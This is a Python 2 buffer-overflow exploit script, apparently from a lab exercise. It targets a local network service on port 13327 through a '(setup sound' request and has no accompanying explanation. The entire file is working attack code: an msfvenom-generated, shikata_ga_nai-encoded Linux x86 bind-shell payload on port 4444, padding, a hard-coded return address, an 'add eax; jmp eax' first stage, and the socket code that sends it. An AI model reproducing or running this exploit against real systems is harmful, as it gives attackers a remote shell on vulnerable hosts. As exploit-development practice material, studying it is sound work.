#!/usr/bin/python 
import socket
import struct, sys

host = "127.0.0.1"

# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
# nasm > add eax,12
# 00000000  83C00C            add eax,byte +0xc
# nasm > jmp eax
# 00000000  FFE0              jmp eax

firststage = "\x83\xc0\x0c\xff\xe0\x90\x90"

# msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f c -b "\x00\x20" --platform linux -a x86 -e x86/shikata_ga_nai
# 105 bytes
shellcode = (
"\xda\xc3\xd9\x74\x24\xf4\xba\x75\x0d\xaa\x33\x58\x33\xc9\xb1"
"\x14\x31\x50\x19\x03\x50\x19\x83\xc0\x04\x97\xf8\x9b\xe8\xa0"
"\xe0\x8f\x4d\x1d\x8d\x2d\xdb\x40\xe1\x54\x16\x02\x59\xc7\xfa"
"\x6a\x5c\xf7\xeb\x36\x0a\xe7\x5a\x96\x43\xe6\x37\x70\x0c\x24"
"\x47\xf5\xed\xb2\xfb\x01\x5e\xdc\x36\x89\xdd\x91\xaf\x44\x61"
"\x42\x76\x3c\x5d\x3d\x44\x40\xe8\xc4\xae\x28\xc4\x19\x3c\xc0"
"\x72\x49\xa0\x79\xed\x1c\xc7\x29\xa2\x97\xe9\x79\x4f\x65\x69"
)

buffer = shellcode + "A" * (4368-len(shellcode)) + struct.pack('<L', 0x08134597) + firststage

request = "\x11(setup sound " + buffer + "\x90\x00#"

print "[*] Sending evil Buffer..."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('127.0.0.1',13327))
s.send(request)
data = s.recv(1024)
print data
s.close()
print "[*] Payload Sent !"
